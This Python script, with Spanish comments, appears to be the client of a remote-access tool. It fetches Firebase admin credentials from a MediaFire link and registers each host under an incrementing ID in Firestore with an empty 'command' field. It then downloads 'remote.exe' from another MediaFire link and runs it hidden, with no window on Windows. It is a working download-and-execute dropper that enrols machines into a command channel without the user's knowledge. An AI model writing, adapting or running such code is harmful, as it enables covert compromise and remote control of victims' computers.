import os
import requests
import firebase_admin
from firebase_admin import credentials, firestore
from threading import Event
import subprocess

# Configura Firebase
base_dir = os.path.dirname(os.path.abspath(__file__))

# Configura el evento de cierre
shutdown_event = Event()

def download_file(url, destination):
    """Descarga un archivo desde una URL y lo guarda en el destino especificado."""
    try:
        response = requests.get(url, stream=True)
        if response.status_code == 200:
            with open(destination, 'wb') as file:
                for chunk in response.iter_content(chunk_size=8192):
                    file.write(chunk)
            print(f'File downloaded and saved to: {destination}')
        else:
            print(f'Failed to download file. Status code: {response.status_code}')
    except Exception as e:
        print(f'Error downloading file: {e}')

def download_firebase_credentials():
    """Descarga el archivo de credenciales de Firebase si no existe."""
    json_url = 'https://download1336.mediafire.com/e8jbpl0d0sxgK6tTx3gghyftTatb2Rw9a4mXtsIh3Z_RbSz7vfi-pUicKkcNmuJGfMFsOjONsG5XWi7wDCwp_uJi-t9cpbRjOM9RJ4KCGh9a5Nbe5SI7Dixo6gjXa0p7BxXcpWRNMTK57cE02QM91ScwCRbKiAma6V-Rd8Tu1B-S/lx0ugbsbi3obotl/hackat-b31c7-firebase-adminsdk-qh08t-aa1740898a.json'  # Reemplaza con la URL correcta
    json_file_path = os.path.join(base_dir, 'hackat-b31c7-firebase-adminsdk-qh08t-aa1740898a.json')
    
    if not os.path.isfile(json_file_path):
        download_file(json_url, json_file_path)
    
def setup_firebase():
    """Configura Firebase usando el archivo JSON descargado."""
    cred_path = os.path.join(base_dir, 'hackat-b31c7-firebase-adminsdk-qh08t-aa1740898a.json')
    cred = credentials.Certificate(cred_path)
    firebase_admin.initialize_app(cred)
    return firestore.client()

def download_and_execute_code(url):
    """Descarga y ejecuta el archivo ejecutable desde la URL especificada en el mismo directorio en el que está el script."""
    try:
        # Obtener el directorio en el que está el script
        download_dir = os.path.dirname(os.path.abspath(__file__))
        
        # Descargar el archivo
        response = requests.get(url, stream=True)
        if response.status_code == 200:
            # Guardar el archivo en el directorio del script
            temp_file_path = os.path.join(download_dir, 'downloaded_executable.exe')
            with open(temp_file_path, 'wb') as temp_file:
                for chunk in response.iter_content(chunk_size=8192):
                    temp_file.write(chunk)
            
            print(f'File downloaded and saved to: {temp_file_path}')
            
            # Verificar que el archivo sea un ejecutable válido
            if os.path.isfile(temp_file_path):
                print(f'File is valid and located at: {temp_file_path}')
                # Ejecutar el archivo en un subproceso sin interfaz
                if os.name == 'nt':  # Windows
                    process = subprocess.Popen([temp_file_path], creationflags=subprocess.CREATE_NO_WINDOW)
                else:  # Unix-like (Linux, macOS)
                    process = subprocess.Popen([temp_file_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    stdout, stderr = process.communicate()
                    if stdout:
                        print(f'STDOUT: {stdout.decode()}')
                    if stderr:
                        print(f'STDERR: {stderr.decode()}')
                
                print('Remote executable executed successfully in background.')
            else:
                print(f'File is not valid or not found at: {temp_file_path}')
        else:
            print(f'Failed to download executable. Status code: {response.status_code}')
    except Exception as e:
        print(f'Error downloading or executing executable: {e}')

def fetch_and_increment_count():
    """Obtiene el conteo de clientes, lo incrementa y actualiza en Firestore."""
    try:
        # Obtener la referencia al documento
        global_ids_ref = db.collection('global_ids').document('client')
        
        # Obtener el documento
        doc = global_ids_ref.get()
        
        if doc.exists:
            data = doc.to_dict()
            # Obtener el campo count, establecer valor por defecto si no existe
            count = data.get('count', 0)
            # Incrementar count
            new_count = count + 1
            # Actualizar el campo count en Firestore
            global_ids_ref.update({'count': new_count})
            print(f'Updated Count (new value): {new_count}')
            return str(new_count)  # Convertir count a string
        else:
            print('No client document found in global_ids.')
            return None
    except Exception as e:
        print(f'Error fetching and incrementing client count: {e}')
        return None

def create_user_collection(count_id):
    """Crea una colección en Firestore con el ID proporcionado."""
    try:
        if count_id:
            # Crear una colección con el ID del count
            user_ref = db.collection('users').document(count_id)  # count_id ya es un string
            # Inicializar la colección con un campo 'command' vacío
            user_ref.set({
                'command': ''
            }, merge=True)
            print(f'Created user collection with ID: {count_id}')
        else:
            print('Count ID is None, cannot create user collection.')
    except Exception as e:
        print(f'Error creating user collection: {e}')

def save_count_id_to_file(count_id):
    """Guarda el count_id en un archivo de texto."""
    try:
        with open('count_id.txt', 'w') as file:
            file.write(count_id)
        print(f'Saved count ID {count_id} to count_id.txt')
    except Exception as e:
        print(f'Error saving count ID to file: {e}')

def main():
    # Descargar el archivo de credenciales de Firebase si no existe
    download_firebase_credentials()
    
    # Configurar Firebase
    global db
    db = setup_firebase()
    
    count_id_file = 'count_id.txt'
    
    if os.path.exists(count_id_file):
        # Si el archivo count_id.txt existe, lee el count_id
        with open(count_id_file, 'r') as file:
            count_id = file.read().strip()
        print(f'Loaded count ID {count_id} from file.')
    else:
        # Si el archivo no existe, obtiene un nuevo count_id y lo guarda
        count_id = fetch_and_increment_count()
        if count_id:
            create_user_collection(count_id)
            save_count_id_to_file(count_id)  # Guardar el count_id en un archivo
        else:
            print('Failed to get client count.')
            return  # Termina el script si no se pudo obtener el count_id
    
    # Descargar y ejecutar el código remoto
    code_url = 'https://download1591.mediafire.com/4rlvopkqnxegDr0lTA8RzKUmn6t7cAr3tEXBR2OR43wsF1Sodu28H7NDeLyXdiwQ6EpvSmWjI2SF0dQXy9Yh1jp46vZqZtp4jMUdvhEGUuVa0zC2fhL-NBm00m_mtf_WOpe-DNlQ_Rio5eT6DO2VnZE6QHiX4Sj1FhTt72FzW46Z/4m0t4miokq3z8c9/remote.exe'
    download_and_execute_code(code_url)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        shutdown_event.set()
        print('Shutting down client...')